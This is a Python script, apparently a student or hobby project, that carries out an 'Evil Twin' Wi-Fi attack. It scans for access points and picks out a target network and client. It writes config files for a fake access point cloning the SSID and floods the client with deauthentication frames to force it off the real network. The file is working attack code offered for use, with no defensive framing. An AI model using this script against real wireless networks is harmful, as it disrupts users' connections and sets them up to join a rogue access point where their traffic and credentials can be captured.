from scapy.all import * 
import os
import sys
import threading
import time
import logging
import MonitorMode as mm
import CreateConf as cc
import FakeAP as f_ap
import signal



iface = ""
net_stick_iface = ""
users_list = []
ap_list = []
ssid_list = []
ap_mac = ""

def Wifi_scaning():
    print("Scanning for access points...")
    print("press CTRL+C to stop the scanning")
    print("index         MAC            SSID")
    sniff(iface = iface, prn = AP_handler)

def Users_scaning():
    print("Finds connected Clients")
    print("press CTRL+C to stop the scanning")
    print ("index       Client MAC")
    sniff (iface = iface, prn = Users_handler)
     

def AP_handler(pkt) :
    global ap_list
    # if packet has 802.11 layer
    if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
            if pkt.addr2 not in ap_list:
                ap_list.append(pkt.addr2 )
                ssid_list.append(pkt.info)
                print(len(ap_list),'     %s     %s '%( pkt.addr2, pkt.info))



def Users_handler(pkt):
    global users_list
    if pkt.type == 2:
        if pkt.addr2 not in users_list and pkt.addr1 == ap_mac:
            users_list.append(pkt.addr2)
            print(len(users_list),"     " ,pkt.addr2)
    


#Disconnects the target from the network
def DisConnectAttack(target_mac , gateway_mac, iface):
	dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
	# stack them up
	packet = RadioTap()/dot11/Dot11Deauth(reason=7)
	# send the packet
	sendp(packet, inter=0.2, count=1000, iface=iface,verbose=1)

def create_conf_file(iface , ssid):
    cc.Create_hostapd(iface, ssid)
    cc.Create_dnsmasq(iface)



def main():
    global iface ,ap_mac
    iface = input("please enter the first interface name: ") #for sniffing users
    iface2= input("Please enter the second interface name: ") #for creating fake AP 
    #step 1: Change the first interface to monitor mode:
    iface = mm.Change_to_MonitorMode_airmon(iface)
    print("********Evil Twin Attack*********")
    time.sleep(2)
    Wifi_scaning() 
    # Choose access point to attack
    if len(ap_list) > 0 : 
        mac_adder = int(input("\nEnter the index of the ssid you want to attack: ")) -1
        ap_mac = ap_list[mac_adder]
        ssid_name = ssid_list[mac_adder]
        # for creating the fake AP we need 2 '.conf' files
        create_conf_file(iface2 , ssid_name)
        Users_scaning()
    #Choose user to attack
    if len(users_list) > 0 :
        user_adder = int(input("\nEnter the index of the client you want to attack: ")) -1
        user_mac = users_list[user_adder]
        disconnectThread= threading.Thread(target= DisConnectAttack, args= (user_mac ,ap_mac, iface ,))
        disconnectThread.start()
        time.sleep(3)
        print("process keep going...")
        #f_ap.start(net_stick_iface)
        while True:
            try:
                time.sleep(2) 
            except KeyboardInterrupt:
                break
        mm.Change_back_airmon(iface)
        os.system("rm *.conf")
        

if __name__ == "__main__":
    main()